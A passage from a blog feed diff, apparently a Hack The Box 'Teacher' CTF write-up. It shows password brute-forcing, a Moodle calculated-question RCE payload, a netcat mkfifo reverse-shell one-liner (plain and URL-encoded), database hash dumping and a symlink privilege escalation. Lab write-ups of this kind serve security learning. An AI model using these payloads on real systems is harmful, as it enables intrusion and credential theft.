-&lt;h4 id=&quot;then-i-added-some-special-chars-manually-like-_--and-finally-i-added-numbers--for-i-in-09-do-echo-th4c00ltheachai-done--listtxt&quot;&gt;Then I added some special chars manually like &lt;code class=&quot;highlighter-rouge&quot;&gt;!@#$%^&amp;amp;*()_-+=.?/\&lt;/code&gt; and finally I added numbers : &lt;code class=&quot;highlighter-rouge&quot;&gt;for i in {0..9}; do echo Th4C00lTheacha$i; done &amp;gt;&amp;gt; list.txt&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;listtxt-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;list.txt&lt;/code&gt; :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Th4C00lTheachaa
-Th4C00lTheachab
-Th4C00lTheachac
-Th4C00lTheachad
-Th4C00lTheachae
-Th4C00lTheachaf
-Th4C00lTheachag
-Th4C00lTheachah
-Th4C00lTheachai
-Th4C00lTheachaj
-Th4C00lTheachak
-Th4C00lTheachal
-Th4C00lTheacham
-Th4C00lTheachan
-Th4C00lTheachao
-Th4C00lTheachap
-Th4C00lTheachaq
-Th4C00lTheachar
-Th4C00lTheachas
-Th4C00lTheachat
-Th4C00lTheachau
-Th4C00lTheachav
-Th4C00lTheachaw
-Th4C00lTheachax
-Th4C00lTheachay
-Th4C00lTheachaz
-Th4C00lTheacha!
-Th4C00lTheacha@
-Th4C00lTheacha#
-Th4C00lTheacha$
-Th4C00lTheacha%
-Th4C00lTheacha^
-Th4C00lTheacha&amp;amp;
-Th4C00lTheacha*
-Th4C00lTheacha(
-Th4C00lTheacha)
-Th4C00lTheacha_
-Th4C00lTheacha-
-Th4C00lTheacha+
-Th4C00lTheacha=
-Th4C00lTheacha.
-Th4C00lTheacha?
-Th4C00lTheacha/
-Th4C00lTheacha\
-Th4C00lTheacha0
-Th4C00lTheacha1
-Th4C00lTheacha2
-Th4C00lTheacha3
-Th4C00lTheacha4
-Th4C00lTheacha5
-Th4C00lTheacha6
-Th4C00lTheacha7
-Th4C00lTheacha8
-Th4C00lTheacha9
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;since-its-a-small-list--i-used-burp-intruder-to-bruteforce-the-password-lets-intercept-the-request-and-send-it-to-intruder-&quot;&gt;Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/10.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/11.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-its-finished--all-the-responses-were-870-bytes-in-length-except-the-response-of-the-payload-th4c00ltheacha&quot;&gt;After it’s finished , all the responses were 870 bytes in length except the response of the payload &lt;code class=&quot;highlighter-rouge&quot;&gt;Th4C00lTheacha#&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-probably-this-is-the-right-password--lets-check&quot;&gt;So probably this is the right password , let’s check.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-worked-and-now-we-are-in-as-giovanni&quot;&gt;It worked and now we are in as &lt;code class=&quot;highlighter-rouge&quot;&gt;Giovanni&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;rce--initial-shell-as-www-data&quot;&gt;RCE , Initial Shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/h3&gt;
-&lt;h4 id=&quot;after-some-enumeration-i-didnt-find-anything-interesting--so-i-searched-on-google-and-found-this-article-lets-try-to-reproduce-that-vulnerability&quot;&gt;After some enumeration I didn’t find anything interesting , so I searched on Google and found this &lt;a href=&quot;https://blog.ripstech.com/2018/moodle-remote-code-execution/&quot;&gt;article&lt;/a&gt;. Let’s try to reproduce that vulnerability.&lt;/h4&gt;
-&lt;h4 id=&quot;first--we-will-go-to-the-algebra-course-&quot;&gt;First , we will go to the &lt;code class=&quot;highlighter-rouge&quot;&gt;Algebra&lt;/code&gt; course :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-turn-editing-on-&quot;&gt;Then we will turn editing on :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-can-edit-the-course--so-we-will-choose-any-topic-and-click-on-add-an-activity-or-resource-and-we-will-choose-quiz-&quot;&gt;Now we can edit the course , so we will choose any topic and click on &lt;code class=&quot;highlighter-rouge&quot;&gt;Add an activity or resource&lt;/code&gt; and we will choose &lt;code class=&quot;highlighter-rouge&quot;&gt;Quiz&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-just-fill-in-the-required-information-&quot;&gt;Then we will just fill in the required information :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-click-on-save-and-display&quot;&gt;And click on &lt;code class=&quot;highlighter-rouge&quot;&gt;Save and display&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-that-we-will-click-on-edit-quiz-&quot;&gt;After that we will click on &lt;code class=&quot;highlighter-rouge&quot;&gt;edit quiz&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-add-a-new-question-question-type-will-be-calculated-&quot;&gt;And add a new question. Question type will be &lt;code class=&quot;highlighter-rouge&quot;&gt;Calculated&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/21.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;again-we-will-fill-in-the-required-information-&quot;&gt;Again we will fill in the required information :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-finally-we-reach-the-actual-exploitation--we-will-set-the-answer-formula-to-&quot;&gt;And finally we reach the actual exploitation , we will set the answer formula to :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*{a*/`$_GET[0]`;//{x}}`
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;this-will-allow-us-to-pass-system-commands-through-a-url-parameter-called-0--more-info-about-how-the-exploit-is-working-can-be-found-in-the-previously-mentioned-article&quot;&gt;This will allow us to pass system commands through a url parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; , More info about how the exploit is working can be found in the previously mentioned article.&lt;/h4&gt;
-&lt;h4 id=&quot;after-saving-the-changes-we-will-get-this-page-&quot;&gt;After saving the changes we will get this page :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-will-click-on-next-page-to-finally-get-to-the-vulnerable-page-&quot;&gt;We will click on &lt;code class=&quot;highlighter-rouge&quot;&gt;Next Page&lt;/code&gt; to finally get to the vulnerable page :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-add-the-parameter-0-and-get-a-reverse-shell-&quot;&gt;Let’s add the parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and get a reverse shell :&lt;/h4&gt;
-&lt;h4 id=&quot;shell--rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-ip-port-tmpf&quot;&gt;Shell : &lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;note--the-payload-is-url-encoded-so-final-payload-will-be--0rmtmpf3bmkfifotmpf3bcattmpfbinsh-i2261ncipporttmpf&quot;&gt;Note : the payload is url encoded. So final payload will be : &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+ip+port+&amp;gt;/tmp/f&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;after-sending-the-request--our-listener-gets-a-callback-and-we-get-a-reverse-shell-as-www-data-&quot;&gt;After sending the request , our listener gets a callback. And we get a reverse shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;there-is-only-giovanni-on-the-box-and-we-cant-access-his-home-directory-as-www-data&quot;&gt;There is only &lt;code class=&quot;highlighter-rouge&quot;&gt;giovanni&lt;/code&gt; on the box and we can’t access his &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;hardcoded-database-credentials--privilege-escalation-to-giovanni&quot;&gt;Hardcoded Database Credentials , Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;giovanni&lt;/code&gt;&lt;/h3&gt;
-&lt;h4 id=&quot;back-to-varwwwhtmlmoodle--i-wanted-to-check-config-files-and-other-stuff-to-see-if-there-are-any-information-that-can-help-and-in-configphp-i-found-database-credentials-&quot;&gt;Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/moodle&lt;/code&gt; , I wanted to check config files and other stuff to see if there are any information that can help. And in &lt;code class=&quot;highlighter-rouge&quot;&gt;config.php&lt;/code&gt; I found database credentials :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;sweet--lets-see-whats-in-there&quot;&gt;Sweet , Let’s see what’s in there.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mysql -h 127.0.0.1 -u root -p&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-are-not-in-any-database-none--lets-list-the-databases-&quot;&gt;We are not in any database &lt;code class=&quot;highlighter-rouge&quot;&gt;[(none)]&lt;/code&gt; , Let’s list the databases :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SHOW DATABASES;&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;moodle-is-interesting-and-might-have-some-passwords&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;moodle&lt;/code&gt; is interesting and might have some passwords.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;USE moodle;&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-lets-check-the-tables-&quot;&gt;Now let’s check the tables :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SHOW TABLES;&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;a-lot-of-tables--but-an-interesting-one-is-called-mdl_user-&quot;&gt;A lot of tables , but an interesting one is called &lt;code class=&quot;highlighter-rouge&quot;&gt;mdl_user&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;alright--lets-see-whats-in-that-table-&quot;&gt;Alright , let’s see what’s in that table :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * from mdl_user;&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-didnt-get-the-best-output-d-but-anyway-i-looked-into-it-and-found-this-md5-hash-&quot;&gt;We didn’t get the best output :D but anyway I looked into it and found this &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; hash :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-its-name-is-giovannibak--probably-a-backup-for-giovannis-password-crackstation-was-able-to-crack-it-&quot;&gt;And its name is &lt;code class=&quot;highlighter-rouge&quot;&gt;Giovannibak&lt;/code&gt; , probably a backup for giovanni’s password. &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; was able to crack it :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-password-is-expelled-we-can-su-to-giovanni&quot;&gt;The password is &lt;code class=&quot;highlighter-rouge&quot;&gt;expelled&lt;/code&gt;, we can &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;giovanni&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-own-user&quot;&gt;Now we own user.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;777-ability-to-read--write-and-execute-anything-on-the-system&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;777&lt;/code&gt;. Ability to read , write and execute anything on the system&lt;/h3&gt;
-&lt;h4 id=&quot;in-giovannis-home-directory-there-is-a-directory-called-work-which-has-two-directories-courses-and-tmp-nothing-special&quot;&gt;In giovanni’s &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory there is a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;work&lt;/code&gt; which has two directories &lt;code class=&quot;highlighter-rouge&quot;&gt;courses&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;tmp&lt;/code&gt;. Nothing Special.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/40.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-a-lot-of-enumeration-i-found-in-usrbin-a-script-called-backupsh-&quot;&gt;After a lot of enumeration I found in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.sh&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/42.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-dont-really-care-about-the-tar-commands--what-we-care-about-is-that-its-changing-current-directory-to-homegiovanniwork-then-changes-it-once-again-to-homegiovanniworktmp-then-changes-permissions-to-777-recursively-this-means-that-any-user-can-read--write-and-execute-any-file-in-homegiovanniworktmp-so-if-we-created-a-symlink-for-root-in-homegiovanniworktmp-and-wait-for-the-script-to-get-executed-by-root-cronjob-we-will-have-access-to-root-in-normal-conditions-creating-a-symlink-to-root-wont-let-you-have-access-to-it-if-you-dont-have-the-permissions-to-because-its-still-linking-to-a-directory-that-you-are-not-authorized-to-access-but-since-the-script-runs-chmod-777-on-homegiovanniworktmp-recursively-anyone-has-access-to-whats-in-there-even-symlinks-this-article-explains-it-very-well-read-this-if-you-dont-know-whats-a-symlink&quot;&gt;We don’t really care about the &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt; commands , What we care about is that it’s changing current directory to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work&lt;/code&gt; then changes it once again to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt; then changes permissions to &lt;code class=&quot;highlighter-rouge&quot;&gt;777&lt;/code&gt; recursively. This means that any user can read , write and execute any file in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt;. So if we created a symlink for &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt; and wait for the script to get executed by root (cronjob) we will have access to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt;. In normal conditions creating a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since the script runs &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 777&lt;/code&gt; on &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt; recursively, Anyone has access to what’s in there even symlinks. This &lt;a href=&quot;https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/&quot;&gt;article&lt;/a&gt; explains it very well. Read &lt;a href=&quot;https://stackabuse.com/symbolic-links-in-unix-linux/&quot;&gt;this&lt;/a&gt; if you don’t know what’s a symlink.&lt;/h4&gt;
-&lt;h4 id=&quot;alright--lets-create-a-symlink-for-root-in-homegiovanniworktmp&quot;&gt;Alright , Let’s create a symlink for &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/giovanni/work/tmp&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ln -s /root ./tmp&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/44.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---redcross&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/redcross/&quot;&gt;Hack The Box - RedCross&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---irked&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/irked/&quot;&gt;Hack The Box - Irked&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><summary type="html">Quick Summary Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to /root or anything else we want to access. It’s a linux box and its ip is 10.10.10.153 I added it to /etc/hosts as teacher.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC teacher.htb We only see http running on port 80. Let’s see what’s in there. HTTP Initial Enumeration There is just a static website titled Blackhat highschool , I looked into other pages like Courses , Students etc… And also checked their source code. And on Gallery : I found this line in the source : for &amp;lt;img src=&quot;images/5.png&quot;&amp;gt; there is an onerror attribute to print That's an F in the console. So I checked the console : Weird let’s check that image. http://teacher.htb/images/5.png : Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all : curl http://teacher.htb/images/5.png Hi Servicedesk, I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha. Could you guys figure out what the last charachter is, or just reset it? Thanks, Giovanni Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt in the background and got some results , one of them was /moodle. http://teacher.htb/moodle Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License -Wikipedia On the login page there’s a guest login : However I couldn’t achieve anything from that guest login. Bruteforcing the last character We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password. for i in {a..z}; do echo Th4C00lTheacha$i; done &amp;gt; list.txt this will print all the letters next to Th4C00lTheacha Then I added some special chars manually like !@#$%^&amp;amp;*()_-+=.?/\ and finally I added numbers : for i in {0..9}; do echo Th4C00lTheacha$i; done &amp;gt;&amp;gt; list.txt list.txt : Th4C00lTheachaa Th4C00lTheachab Th4C00lTheachac Th4C00lTheachad Th4C00lTheachae Th4C00lTheachaf Th4C00lTheachag Th4C00lTheachah Th4C00lTheachai Th4C00lTheachaj Th4C00lTheachak Th4C00lTheachal Th4C00lTheacham Th4C00lTheachan Th4C00lTheachao Th4C00lTheachap Th4C00lTheachaq Th4C00lTheachar Th4C00lTheachas Th4C00lTheachat Th4C00lTheachau Th4C00lTheachav Th4C00lTheachaw Th4C00lTheachax Th4C00lTheachay Th4C00lTheachaz Th4C00lTheacha! Th4C00lTheacha@ Th4C00lTheacha# Th4C00lTheacha$ Th4C00lTheacha% Th4C00lTheacha^ Th4C00lTheacha&amp;amp; Th4C00lTheacha* Th4C00lTheacha( Th4C00lTheacha) Th4C00lTheacha_ Th4C00lTheacha- Th4C00lTheacha+ Th4C00lTheacha= Th4C00lTheacha. Th4C00lTheacha? Th4C00lTheacha/ Th4C00lTheacha\ Th4C00lTheacha0 Th4C00lTheacha1 Th4C00lTheacha2 Th4C00lTheacha3 Th4C00lTheacha4 Th4C00lTheacha5 Th4C00lTheacha6 Th4C00lTheacha7 Th4C00lTheacha8 Th4C00lTheacha9 Since it’s a small list , I used burp intruder to bruteforce the password. Let’s intercept the request and send it to intruder : After it’s finished , all the responses were 870 bytes in length except the response of the payload Th4C00lTheacha#. So probably this is the right password , let’s check. It worked and now we are in as Giovanni RCE , Initial Shell as www-data After some enumeration I didn’t find anything interesting , so I searched on Google and found this article. Let’s try to reproduce that vulnerability. First , we will go to the Algebra course : Then we will turn editing on : Now we can edit the course , so we will choose any topic and click on Add an activity or resource and we will choose Quiz : Then we will just fill in the required information : And click on Save and display. After that we will click on edit quiz : And add a new question. Question type will be Calculated : Again we will fill in the required information : And finally we reach the actual exploitation , we will set the answer formula to : /*{a*/`$_GET[0]`;//{x}}` This will allow us to pass system commands through a url parameter called 0 , More info about how the exploit is working can be found in the previously mentioned article. After saving the changes we will get this page : We will click on Next Page to finally get to the vulnerable page : Let’s add the parameter 0 and get a reverse shell : Shell : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f Note : the payload is url encoded. So final payload will be : &amp;amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+ip+port+&amp;gt;/tmp/f After sending the request , our listener gets a callback. And we get a reverse shell as www-data : There is only giovanni on the box and we can’t access his /home directory as www-data. Hardcoded Database Credentials , Privilege Escalation to giovanni Back to /var/www/html/moodle , I wanted to check config files and other stuff to see if there are any information that can help. And in config.php I found database credentials : Sweet , Let’s see what’s in there. mysql -h 127.0.0.1 -u root -p We are not in any database [(none)] , Let’s list the databases : SHOW DATABASES; moodle is interesting and might have some passwords. USE moodle; Now let’s check the tables : SHOW TABLES; A lot of tables , but an interesting one is called mdl_user : Alright , let’s see what’s in that table : SELECT * from mdl_user; We didn’t get the best output :D but anyway I looked into it and found this md5 hash : And its name is Giovannibak , probably a backup for giovanni’s password. crackstation was able to crack it : The password is expelled, we can su to giovanni Now we own user. 777. Ability to read , write and execute anything on the system In giovanni’s /home directory there is a directory called work which has two directories courses and tmp. Nothing Special. After a lot of enumeration I found in /usr/bin a script called backup.sh : We don’t really care about the tar commands , What we care about is that it’s changing current directory to /home/giovanni/work then changes it once again to /home/giovanni/work/tmp then changes permissions to 777 recursively. This means that any user can read , write and execute any file in /home/giovanni/work/tmp. So if we created a symlink for /root in /home/giovanni/work/tmp and wait for the script to get executed by root (cronjob) we will have access to /root. In normal conditions creating a symlink to /root won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since the script runs chmod 777 on /home/giovanni/work/tmp recursively, Anyone has access to what’s in there even symlinks. This article explains it very well. Read this if you don’t know what’s a symlink. Alright , Let’s create a symlink for /root in /home/giovanni/work/tmp ln -s /root ./tmp And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - RedCross Next Hack The Box write-up : Hack The Box - Irked</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/teacher/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Web" /><category term="Reverse Engineering" /><category term="egghunting" /><category term="Buffer Overflow" /><category term="Windows Exploitation" /><category term="Exploit Development" /><category term="LFI" /><category term="RCE" /><category term="Forensics" /><category term="Networking" /><category term="Pivoting" /><category term="ssh" /><category term="code analysis" /><category term="Python" /><category term="php" /><summary type="html">Quick Summary Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of Silicon Valley references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is 10.10.10.112. I added it to /etc/hosts as bighead.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC bighead.htb Only one port is open which is port 80 and it’s running http. Let’s take a look. HTTP Enumeration It’s a website titled PiperNet Comes. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying PIPERNET IS 